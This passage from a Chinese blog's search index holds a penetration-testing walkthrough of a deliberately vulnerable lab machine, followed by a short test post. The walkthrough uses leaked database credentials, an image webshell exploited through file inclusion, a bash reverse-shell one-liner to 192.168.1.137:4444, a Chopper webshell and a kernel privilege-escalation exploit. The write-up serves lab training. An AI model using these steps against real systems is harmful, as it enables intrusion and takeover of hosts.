src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232247255.png" alt="image-20201231232247255"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232539359.png" alt="image-20201231232539359"></p><h6 id="5-查看c-php源码"><a href="#5-查看c-php源码" class="headerlink" title="5.查看c.php源码"></a>5.查看c.php源码</h6><p>这是个数据库连接文件，人家直接写了mysql连接用户名密码</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231232908417.png" alt="image-20201231232908417"></p><h6 id="6-通过dirb暴破出-phpmy目录，访问该目录到phpmyadmin登录页面"><a href="#6-通过dirb暴破出-phpmy目录，访问该目录到phpmyadmin登录页面" class="headerlink" title="6.通过dirb暴破出/phpmy目录，访问该目录到phpmyadmin登录页面"></a>6.通过dirb暴破出/phpmy目录，访问该目录到phpmyadmin登录页面</h6><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231233502816.png" alt="image-20201231233502816"></p><p>用刚刚在c.php看到的用户名：billu，密码：b0x_billu登录，登录成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231233707322.png" alt="image-20201231233707322"></p><p>在ica_lab数据库的auth表中，找到web登录的用户名：biLLu，密码：hEx_it</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231233638955.png" alt="image-20201231233638955"></p><h6 id="7-回index-php，登进去"><a href="#7-回index-php，登进去" class="headerlink" title="7.回index.php，登进去"></a>7.回index.php，登进去</h6><p>进来以后看到一个账号管理界面，里面已经有了两个账户，杰克船长和巴博萨船长</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231234202943.png" alt="image-20201231234202943"></p><p>两个账号的头像图片地址，在之前已经暴破出来：uploaded_images，登上去，下载一张图片jack.jpg出来，里面有些乱七八糟的东西，是我第一遍做的时候传上去的，不管它们，不影响接着做</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20201231234443183.png" alt="image-20201231234443183"></p><h6 id="7-点击add-user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。"><a href="#7-点击add-user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。" class="headerlink" title="7.点击add user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。"></a>7.点击add user进入添加账号界面，这是一个图片上传，可以利用图片上传和文件包含获得shell。</h6><p>查看之前test文件包含获得的panel.php源码，发现panel.php存在本地文件包含漏洞：</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101103835037.png" alt="image-20210101103835037"></p><p>用文本编辑器打开刚刚下载下来的图片，在文件末尾加一条命令，生成图片马</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101104540102.png" alt="image-20210101104540102"></p><p>把这张图片上传上去</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101111249263.png" alt="image-20210101111249263"></p><p>测试一下图片马能否正常使用，点击continue，用burp抓包，使用burp执行命令：</p><p>post请求url中加入执行命令的参数：POST /panel.php?cmd=cat%20/etc/passwd;ls</p><p>post的body中包含cmd.jpg图片马：load=/uploaded_images/3.jpg&amp;continue=continue</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101111519306.png" alt="image-20210101111519306"></p><p>可以看到测试没有问题，命令成功被执行</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101111627588.png" alt="image-20210101111627588"></p><h6 id="8-制作一个反弹shell，命令：echo-“bash-i-gt-amp-dev-tcp-192-168-1-137-4444-0-gt-amp-1″-bash"><a href="#8-制作一个反弹shell，命令：echo-“bash-i-gt-amp-dev-tcp-192-168-1-137-4444-0-gt-amp-1″-bash" class="headerlink" title="8.制作一个反弹shell，命令：echo “bash -i &gt;&amp; /dev/tcp/192.168.1.137/4444 0&gt;&amp;1″ | bash"></a>8.制作一个反弹shell，命令：echo “bash -i &gt;&amp; /dev/tcp/192.168.1.137/4444 0&gt;&amp;1″ | bash</h6><p>需要先将命令url编码：</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101120048156.png" alt="image-20210101120048156"></p><p>在post的url中加入编码好的命令</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101125246031.png" alt="image-20210101125246031"></p><p>在发送前，先在命令行nc监听，以便接受反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101113430892.png" alt="image-20210101113430892"></p><p>点击发送，接收成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101125854351.png" alt="image-20210101125854351"></p><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><h6 id="1-提权准备工作"><a href="#1-提权准备工作" class="headerlink" title="1.提权准备工作"></a>1.提权准备工作</h6><p>这里需要找一个有写权限的目录，先前我们上传图片的那个目录/uploaded_images，很显然就有写权限，不然也没法往里面上传图片，我们在这个目录下写一个菜刀马，一会方便用菜刀连接传输文件</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101130935950.png" alt="image-20210101130935950"></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101130908414.png" alt="image-20210101130908414"></p><p>菜刀连接一下，如图连接成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101131453390.png" alt="image-20210101131453390"></p><h6 id="2-提升权限"><a href="#2-提升权限" class="headerlink" title="2.提升权限"></a>2.提升权限</h6><p>查看系统内核，命令uanme -a和cat /etc/issue</p><p>可以看到详细的系统信息</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132344836.png" alt="image-20210101132344836"></p><p>这里可以使用一个著名的ubuntu本地提权exp，<a href="https://www.exploit-db.com/exploits/37292%EF%BC%8C%E8%BF%99%E4%B8%AA%E9%93%BE%E6%8E%A5%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5">https://www.exploit-db.com/exploits/37292，这个链接可以下载下来</a></p><p>下载后把这个文件用菜刀放到/uploaded_images目录下</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132746285.png" alt="image-20210101132746285"></p><p>然后赋予这个文件权限</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132913066.png" alt="image-20210101132913066"></p><p>编译exp</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101132958470.png" alt="image-20210101132958470"></p><p>然后运行即可提权</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101133102180.png" alt="image-20210101133102180"></p><p>查看是否生效，如图，提权成功</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//img/image-20210101135446041.png" alt="image-20210101135446041"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在爆破完目录后注意要尽量利用test.php下载所有可下载的页面源码，以提高发现漏洞的可能；在登录phpmyadmin和拿到普通用户密码登录index.php时，要注意区分大小写；在上传图片马成功准备制作反弹shell时，尽量不要耽搁时间，页面会话时间较短，很容易会话过期，在利用图片马时，发送至repeater模块的请求是带有cookie的，若页面会话过期注意重新登录后更换请求，不然带着过期的cookie进行请求会一直接收不到反弹shell（被这个折磨了很久，一开始一直找不到原因）</p>]]></content>
    
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>test-blog</title>
    <link href="/2021/04/27/test-blog/"/>
    <url>/2021/04/27/test-blog/</url>
    
    <content type="html"><![CDATA[<p>你好，这是一个测试博客</p><p><a href="https://imgtu.com/i/gCFQXQ"><img src="https://z3.ax1x.com/2021/04/27/gCFQXQ.jpg" alt="gCFQXQ.jpg"></a></p>]]></content>
    
    
    
    <tags>
      
      <tag>test</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
